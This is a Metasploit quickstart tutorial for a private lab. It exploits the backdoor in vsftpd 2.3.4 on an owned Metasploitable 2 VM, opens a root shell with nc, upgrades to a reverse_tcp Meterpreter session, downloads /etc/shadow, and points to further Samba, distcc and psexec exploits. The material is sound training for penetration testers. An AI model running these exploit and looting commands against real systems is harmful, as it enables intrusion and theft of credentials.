# Metasploit Quickstart — first exploit & Meterpreter session

Prereq: `lab/setup-attacker.sh` finished (Metasploit installed, `msfdb init`
ran), Metasploitable 2 up at `192.168.56.40` per `lab/setup-victims.md`.

The workflow every engagement follows: **scan → identify → exploit →
post-exploit → loot**. We keep it to a known-vulnerable box you own.

## 1. Verify the database

```bash
msfdb status        # should say connected to metasploitservice
```

If it's not, `sudo msfdb init` once. The DB stores workspaces, hosts,
vulns, and loot — using it is the difference between a lab and a
spreadsheet.

## 2. Start msfconsole

```bash
msfconsole
```

You get the `msf6 >` prompt. Everything below is at that prompt.

## 3. Scan the target (from inside msfconsole)

```bash
db_nmap -sV -p 21 192.168.56.40
```

Output will include:

```
21/tcp open  ftp     vsftpd 2.3.4
```

That banner is the whole ballgame — vsftpd 2.3.4 has a famous
intentionally-backdoored command handler. It's the canonical "first
shell" exercise.

> `db_nmap` feeds results straight into the metasploit DB — you can
> later query with `hosts` and `services`.

## 4. Run the exploit

```bash
search vsftpd                     # find the module
use exploit/unix/ftp/vsftpd_234_backdoor
show options                      # read what it needs
set RHOSTS 192.168.56.40
run
```

If the stars align (they will — lab box, no auth required):

```
[*] 192.168.56.40:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.40:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Wait — `no session was created`? Expected on the _first_ run. This
exploit opens a shell on **port 6200** on the target, not inline. From
the same box, in a second msfconsole window (or your shell):

```bash
nc 192.168.56.40 6200
```

You should now have a root `sh` shell on Metasploitable 2. That's your
clean first foothold. `exit` to close it, then re-run
`exploit/unix/ftp/vsftpd_234_backdoor` — this time you'll see
`Command shell session X opened` inline and can background it.

## 5. Upgrade to a proper Meterpreter session

A raw shell is boring; a payload session isn't. From the msfconsole
prompt with the exploit still loaded:

```bash
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
run
```

Wait for `Meterpreter session X opened ...`, then:

```bash
sessions -i X
```

Meterpreter basics on the session:

```
getuid                # check context (root)
sysinfo               # OS, arch, domain
shell                 # drop a real OS shell (exit to return)
download /etc/shadow /tmp/     # loot (you own this box)
ps
getenv HOME
```

Type `help` inside Meterpreter for the full command list.

## 6. Clean up

```
sessions -k X         # kill the session
exit -y               # leave msfconsole (the -y skips the survey nag)
```

Delete any dropped files on the victim, restore the snapshot from
`setup-victims.md`. Inside msf you can also `workspace -d` to wipe the
DB record of the run when you want a clean slate.

---

## Common hiccups

| Symptom                                 | Fix                                                                                                         |
| --------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `msfdb status` says not connected       | Run `sudo msfdb init` once; then it stays up across reboots                                                 |
| `no session was created` on vsftpd      | See step 4 — first run listens on the target's port 6200; `nc 192.168.56.40 6200`                           |
| Exploit runs but session dies instantly | Check `LHOST`: it must be `192.168.56.10` (reachable from the victim), not `127.0.0.1`                      |
| `run` hangs forever                     | Payload can't get a callback — verify the victim can `ping 192.168.56.10`, and reverse_tcp isn't firewalled |

---

## What to try after this

- Same machine, different service: `db_nmap -sV 192.168.56.40`, then
  search Metasploit's module list for the Samba (`usermap_script`) and
  distcc entries.
- Windows victim: `exploit/windows/smb/psexec` with lab creds.
  Set `PAYLOAD windows/x64/meterpreter/reverse_tcp`, `RHOSTS 192.168.56.20`.
- The full drill list is in `exercises-and-detection.md`.
